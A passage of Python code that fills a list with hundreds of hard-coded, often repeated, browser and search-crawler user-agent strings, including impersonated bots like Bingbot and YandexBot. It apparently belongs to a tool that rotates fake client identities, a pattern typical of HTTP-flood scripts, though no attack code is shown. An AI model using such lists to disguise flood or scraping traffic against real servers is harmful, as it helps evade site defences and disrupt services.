    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1;"
        " WOW64; Trident/5.0; FunWebProducts)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30;"
        " .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR"
        " 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html)"
        " Gecko/2008032620"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot"
        " www.idealobserver.com"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; Arachmo)")
    headers_useragents.append("Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible;"
        " +http://www.become.com/site_owners.html)"
    )
    headers_useragents.append("BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    )
    headers_useragents.append(
        "Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML,"
        " like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser"
        " 1.98.744; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo"
        " Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;"
        " Avant Browser)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser;"
        " GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1;"
        " .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like"
        " Gecko, Safari/419.3) Cheshire/1.0.ALPHA"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like"
        " Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML,"
        " like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
    )
    headers_useragents.append(
        "Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML,"
        " like Gecko) Version/7.0.3 Safari/7046A194A"
    )
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 3.55)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 2.00)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 1.00)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)"
    )
    headers_useragents.append("SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)")
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (FM Scene 4.6.1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) "
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004"
        " Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none;"
        " freenet DSL 1.1; (none))"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie;"
        " .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like"
        " Gecko) Safari/417.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010"
        " Firefox/1.0.7 (Ubuntu package 1.0.7)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
